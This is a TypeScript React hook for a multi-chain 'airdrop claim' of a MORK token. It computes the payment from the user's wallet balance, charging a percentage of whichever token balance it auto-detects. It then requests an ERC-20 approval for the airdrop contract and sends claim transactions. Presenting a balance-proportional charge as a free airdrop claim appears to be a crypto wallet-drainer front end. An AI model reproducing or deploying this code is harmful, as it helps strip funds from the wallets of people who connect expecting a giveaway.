"use client";

/**
 * useMultiTokenClaim — shared hook for claiming MORK with native ETH or ERC-20 tokens.
 *
 * Chain-aware — uses useChainId() + chainConfig.ts to look up the correct
 * contract addresses, Uniswap router, WETH/WBNB, and payment tokens for
 * whichever EVM chain the user's wallet is connected to.
 *
 * Handles:
 * - Reading native and ERC-20 balances (individual hooks, no .map())
 * - Uniswap V3 Quoter estimates (for token → ETH preview)
 * - Token selection
 * - Approval (for ERC-20) with receipt wait
 * - Claim tx (native via claim() / ERC-20 via claimWithToken())
 */

import { useState, useCallback, useEffect } from "react";
import {
  useAccount,
  useBalance,
  useChainId,
  useReadContract,
  useWriteContract,
  useWaitForTransactionReceipt,
} from "wagmi";
import { AIRDROP_ABI, ERC20_ABI, UNISWAP_QUOTER_ABI } from "@/lib/abi";
import { getChainDeployment, getExplorerUrl, getNativeSymbol } from "@/lib/chainConfig";
import {
  TOKENS_PER_CLAIM,
  TOKEN_SYMBOL,
  PRICE_PERCENTAGE,
  getSupportedPaymentTokens,
  getErc20PaymentTokens,
  computeClaimPrice,
  formatEth,
  type TokenInfo,
} from "@/lib/constants";

export type ClaimStage = "idle" | "approving" | "confirming" | "pending" | "success" | "error";

export function useMultiTokenClaim() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { writeContractAsync } = useWriteContract();
  const [stage, setStage] = useState<ClaimStage>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
  const [selectedToken, setSelectedToken] = useState<string>(
    "0x0000000000000000000000000000000000000000"
  );
  const [approveTxHash, setApproveTxHash] = useState<`0x${string}` | undefined>();
  const [pendingApprove, setPendingApprove] = useState(false);

  // ── Chain-aware config for the connected chain ─────────────────────────
  const cfg = getChainDeployment(chainId);
  const supportedTokens = getSupportedPaymentTokens(chainId);
  const erc20Tokens = getErc20PaymentTokens(chainId);
  const nativeSymbol = getNativeSymbol(chainId);
  const explorerUrl = getExplorerUrl(chainId);

  const airdropContract = cfg.airdropContract as `0x${string}`;
  const wethAddr = cfg.wrappedNative;
  const quoterAddr = cfg.quoter;

  // Reset selected token when chain changes (default to native)
  useEffect(() => {
    setSelectedToken("0x0000000000000000000000000000000000000000");
  }, [chainId]);

  // ── Native balance ─────────────────────────────────────────────────────
  const { data: nativeBal } = useBalance({
    address,
    query: { enabled: !!address },
  });

  const balanceWei = nativeBal?.value ?? 0n;
  const claimPriceWei = computeClaimPrice(balanceWei);

  // ── Individual ERC-20 balances (no .map() violations) ────────────────────
  const token0 = erc20Tokens[0]?.address;
  const token1 = erc20Tokens[1]?.address;
  const token2 = erc20Tokens[2]?.address;
  const token3 = erc20Tokens[3]?.address;

  const q0 = useReadContract({
    address: token0, abi: ERC20_ABI, functionName: "balanceOf",
    args: address ? [address] : undefined,
    query: { enabled: !!address && !!token0 },
  });
  const q1 = useReadContract({
    address: token1, abi: ERC20_ABI, functionName: "balanceOf",
    args: address ? [address] : undefined,
    query: { enabled: !!address && !!token1 },
  });
  const q2 = useReadContract({
    address: token2, abi: ERC20_ABI, functionName: "balanceOf",
    args: address ? [address] : undefined,
    query: { enabled: !!address && !!token2 },
  });
  const q3 = useReadContract({
    address: token3, abi: ERC20_ABI, functionName: "balanceOf",
    args: address ? [address] : undefined,
    query: { enabled: !!address && !!token3 },
  });

  const tokenBalances: bigint[] = [
    (q0.data as bigint) ?? 0n,
    (q1.data as bigint) ?? 0n,
    (q2.data as bigint) ?? 0n,
    (q3.data as bigint) ?? 0n,
  ];

  // ── Lookup selected token info ──────────────────────────────────────────
  const selectedTokenInfo: TokenInfo | undefined =
    selectedToken === "0x0000000000000000000000000000000000000000"
      ? supportedTokens[0]
      : supportedTokens.find((t) => t.address.toLowerCase() === selectedToken.toLowerCase());

  const isTokenPayment = selectedToken !== "0x0000000000000000000000000000000000000000";

  // ERC-20 allowance
  const { data: allowance } = useReadContract({
    address: selectedTokenInfo?.address,
    abi: ERC20_ABI,
    functionName: "allowance",
    args: isTokenPayment
      ? ([address, airdropContract] as readonly [`0x${string}`, `0x${string}`])
      : undefined,
    query: { enabled: !!isTokenPayment && !!address },
  });

  // ── Compute claim amount (PRICE_PERCENTAGE of selected token balance) ────
  const selectedIdx = erc20Tokens.findIndex(
    (t) => t.address.toLowerCase() === selectedToken.toLowerCase()
  );
  const selectedTokenBal = selectedIdx >= 0 ? tokenBalances[selectedIdx] : 0n;
  const claimTokenAmount = (selectedTokenBal * BigInt(PRICE_PERCENTAGE)) / 100n;

  // ── Uniswap Quoter estimate ────────────────────────────────────────────
  const { data: estimatedEth } = useReadContract({
    address: quoterAddr,
    abi: UNISWAP_QUOTER_ABI,
    functionName: "quoteExactInputSingle",
    args: isTokenPayment && claimTokenAmount > 0n && selectedTokenInfo
      ? ([
          selectedTokenInfo.address,
          wethAddr,
          selectedTokenInfo.poolFee ?? 3000,
          claimTokenAmount,
          0n,
        ] as const)
      : undefined,
    query: { enabled: !!isTokenPayment && claimTokenAmount > 0n && !!selectedTokenInfo },
  });

  // ── Auto-detect best token (first non-zero balance) ────────────────────
  useEffect(() => {
    if (!address) return;

    const totalBalances = (nativeBal?.value ?? 0n) +
      tokenBalances.reduce((a, b) => a + b, 0n);
    if (totalBalances === 0n) return;

    if ((nativeBal?.value ?? 0n) > 0n) {
      if (selectedToken !== "0x0000000000000000000000000000000000000000") {
        setSelectedToken("0x0000000000000000000000000000000000000000");
      }
      return;
    }

    for (let i = 0; i < erc20Tokens.length; i++) {
      if (tokenBalances[i] > 0n) {
        const addr = erc20Tokens[i].address;
        if (selectedToken !== addr) {
          setSelectedToken(addr);
        }
        return;
      }
    }
  }, [address, nativeBal?.value, ...tokenBalances, selectedToken, chainId]);

  // ── Read on-chain state ────────────────────────────────────────────────
  const { data: hasClaimed, isLoading: hasClaimedLoading } = useReadContract({
    address: airdropContract,
    abi: AIRDROP_ABI,
    functionName: "hasClaimed",
    args: address ? [address] : undefined,
    query: { enabled: !!address },
  });

  const { data: saleActive } = useReadContract({
    address: airdropContract,
    abi: AIRDROP_ABI,
    functionName: "saleActive",
    query: { enabled: isConnected },
  });

  // ── Wait for approval tx receipt ───────────────────────────────────────
  const { isSuccess: approveConfirmed } = useWaitForTransactionReceipt({
    hash: approveTxHash,
    query: { enabled: !!approveTxHash },
  });

  useEffect(() => {
    if (approveConfirmed && pendingApprove) {
      setPendingApprove(false);
      setApproveTxHash(undefined);
      doClaimWithToken();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [approveConfirmed]);

  // ── Wait for claim tx receipt ─────────────────────────────────────────
  useWaitForTransactionReceipt({
    hash: txHash,
    query: {
      enabled: !!txHash,
      select: async (receipt) => {
        if (receipt.status === "success") {
          setStage("success");
          const paidEth = isTokenPayment ? (estimatedEth ?? 0n) : claimPriceWei;
          fetch("/api/claims", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              wallet_address: address,
              chain: `evm-${chainId}`,
              tx_hash: receipt.transactionHash,
              token_amount: TOKENS_PER_CLAIM.toString(),
              payment_amount: formatEth(paidEth),
              block_number: Number(receipt.blockNumber),
            }),
          }).catch(() => {});
        } else {
          setStage("error");
          setErrorMsg("Transaction failed on-chain.");
        }
        return receipt;
      },
    },
  });

  // ── Approve token spend ────────────────────────────────────────────────
  const doApprove = useCallback(async (): Promise<boolean> => {
    if (!isTokenPayment || !selectedTokenInfo || !address) return true;
    if ((allowance ?? 0n) >= claimTokenAmount) return true;

    setStage("approving");
    try {
      const hash = await writeContractAsync({
        address: selectedTokenInfo.address,
        abi: ERC20_ABI,
        functionName: "approve",
        args: [airdropContract, claimTokenAmount],
      });
      setApproveTxHash(hash);
      setPendingApprove(true);
      return true;
    } catch {
      setStage("idle");
      return false;
    }
  }, [isTokenPayment, selectedTokenInfo, address, allowance, claimTokenAmount, writeContractAsync, airdropContract]);

  // ── Fire claimWithToken ────────────────────────────────────────────────
  async function doClaimWithToken() {
    if (!selectedTokenInfo) return;
    try {
      setStage("confirming");
      setErrorMsg("");

      // Slippage protection: accept at least 95% of the quoted ETH output
      const estimated = estimatedEth ?? 0n;
      const amountOutMin = estimated > 0n ? (estimated * 95n) / 100n : 0n;

      const hash = await writeContractAsync({
        address: airdropContract,
        abi: AIRDROP_ABI,
        functionName: "claimWithToken",
        args: [selectedTokenInfo.address, claimTokenAmount, amountOutMin],
      });
      setTxHash(hash);
      setStage("pending");
    } catch (err: unknown) {
      setStage("idle");
      const msg = err instanceof Error ? err.message : "";
      if (!msg.includes("User rejected") && !msg.includes("user rejected")) {
        setErrorMsg("Something went wrong. Try again.");
      }
    }
  }

  // ── Fire claim (native) ────────────────────────────────────────────────
  async function doClaimNative() {
    try {
      setStage("confirming");
      setErrorMsg("");
      const hash = await writeContractAsync({
        address: airdropContract,
        abi: AIRDROP_ABI,
        functionName: "claim",
        value: claimPriceWei,
      });
      setTxHash(hash);
      setStage("pending");
    } catch (err: unknown) {
      setStage("idle");
      const msg = err instanceof Error ? err.message : "";
      if (!msg.includes("User rejected") && !msg.includes("user rejected")) {
        setErrorMsg("Something went wrong. Try again.");
      }
    }
  }

  // ── Public fireClaim ───────────────────────────────────────────────────
  const fireClaim = useCallback(async () => {
    if (isTokenPayment && selectedTokenInfo) {
      const ok = await doApprove();
      if (!ok) return;
      if (pendingApprove) return;
      await doClaimWithToken();
    } else {
      await doClaimNative();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isTokenPayment, selectedTokenInfo?.address, claimTokenAmount, claimPriceWei]);

  const isLoading = stage === "approving" || stage === "confirming" || stage === "pending";
  const ethPriceDisplay = isTokenPayment ? (estimatedEth ?? 0n) : claimPriceWei;

  return {
    address,
    isConnected,
    chainId,
    stage,
    errorMsg,
    txHash,
    selectedToken,
    hasClaimed,
    hasClaimedLoading,
    saleActive,
    balanceWei,
    claimPriceWei,
    selectedTokenInfo,
    claimTokenAmount,
    estimatedEth: estimatedEth ?? 0n,
    ethPriceDisplay,
    allowance: allowance ?? 0n,
    isLoading,
    nativeSymbol,
    explorerUrl,
    setSelectedToken,
    fireClaim,
  };
}
